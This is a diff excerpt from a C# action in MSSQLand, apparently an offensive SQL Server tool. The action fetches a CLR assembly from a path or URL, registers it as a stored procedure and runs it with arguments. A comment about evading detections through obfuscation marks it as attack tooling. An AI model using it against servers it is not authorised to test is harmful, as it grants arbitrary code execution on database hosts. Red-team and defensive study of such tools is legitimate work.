@@ -1,21 +1,38 @@
 // MSSQLand/Actions/Execution/ClrExecution.cs
 
+using MSSQLand.Services;
+using MSSQLand.Utilities;
 using System;
 using System.IO;
 using System.Net;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
-using MSSQLand.Utilities;
-using MSSQLand.Services;
 
 namespace MSSQLand.Actions.Execution
 {
+    /// <summary>
+    /// Executes a CLR (Common Language Runtime) assembly within the SQL Server context.
+    /// WARNING: The assembly used is written on disk at some point by sqlserver.exe, which may trigger detections. Use with caution and ensure the assembly is clean and obfuscated if necessary.
+    /// Assemblies should contain functions callable from SQL Server, typically with a signature like:
+    /// <code>
+    /// public static void Exec(string args)
+    /// </code>
+    /// The SQL types available for parameters are limited, so complex data should be passed as a single string argument and parsed within the assembly.
+    /// https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration-database-objects-types-net-framework/mapping-clr-parameter-data?view=sql-server-ver17&tabs=csharp
+    /// </summary>
     internal class ClrExecution : BaseAction
     {
         [ArgumentMetadata(Position = 0, Required = true, Description = "DLL URI (local path or HTTP/S URL)")]
         private string _dllURI = string.Empty;
-        
-        [ArgumentMetadata(Position = 1, Description = "Function name to execute (default: Main)")]
-        private string _function = "Main";
+
+        [ArgumentMetadata(Position = 1, Required = true, Description = "Class name containing the function to execute")]
+        private string _className = string.Empty;
+
+        [ArgumentMetadata(Position = 2, Required = true, Description = "Function name to execute")]
+        private string _function = string.Empty;
+
+        [ArgumentMetadata(Position = 3, Remainder = true, Description = "Function args")]
+        private string _args = string.Empty;
 
         public override object Execute(DatabaseContext databaseContext)
         {
@@ -108,10 +125,9 @@ namespace MSSQLand.Actions.Execution
 
                 Logger.Success($"Assembly '{assemblyName}' successfully created");
 
-                // Step 4: Create the stored procedure linked to the assembly
                 Logger.Task("Creating the stored procedure linked to the assembly");
                 databaseContext.QueryService.ExecuteNonProcessing(
-                    $"CREATE PROCEDURE [dbo].[{_function}] AS EXTERNAL NAME [{assemblyName}].[StoredProcedures].[{_function}];");
+                    $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}];");
 
                 if (!databaseContext.ConfigService.CheckProcedures(_function))
                 {
@@ -123,7 +139,7 @@ namespace MSSQLand.Actions.Execution
 
                 // Step 5: Execute the stored procedure
                 Logger.Task($"Executing the stored procedure '{_function}'");
-                databaseContext.QueryService.ExecuteNonProcessing($"EXEC {_function};");
+                databaseContext.QueryService.ExecuteNonProcessing($"EXEC [{_function}] @args = '{_args}';");
                 Logger.Success("Stored procedure executed successfully");
 
                 return true;
